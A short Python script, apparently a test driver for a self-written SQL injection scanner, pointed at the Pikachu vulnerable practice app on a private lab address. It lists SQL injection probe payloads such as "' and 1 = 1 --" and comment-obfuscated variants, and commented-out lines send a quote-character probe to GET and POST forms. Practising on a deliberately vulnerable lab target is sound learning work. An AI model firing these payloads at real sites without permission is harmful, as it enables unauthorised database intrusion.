import requests

from SQLinject.lib.core import Request

if __name__ == '__main__':
    url = 'http://192.168.249.131/pikachu/vul/sqli/sqli_str.php'
    payload = ["' and 1 = 1 --", "%d and 1 = 1 -- ",' and 1 = 1', '/**/and/**/1=1/**/--/**/']
    re = Request.request
    re.getvaluename(url)



    # url1 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_id.php'
    # data1 = {
    #     'id': "2'",
    #     'submit': '提交'
    # }
    #
    # url2 = 'http://192.168.249.131/pikachu/vul/sqli/sqli_str.php'
    # data2 = "?name='&submit=查询"
    #
    # print(re.setpost(url1, data1), re.setget(url2, data2))
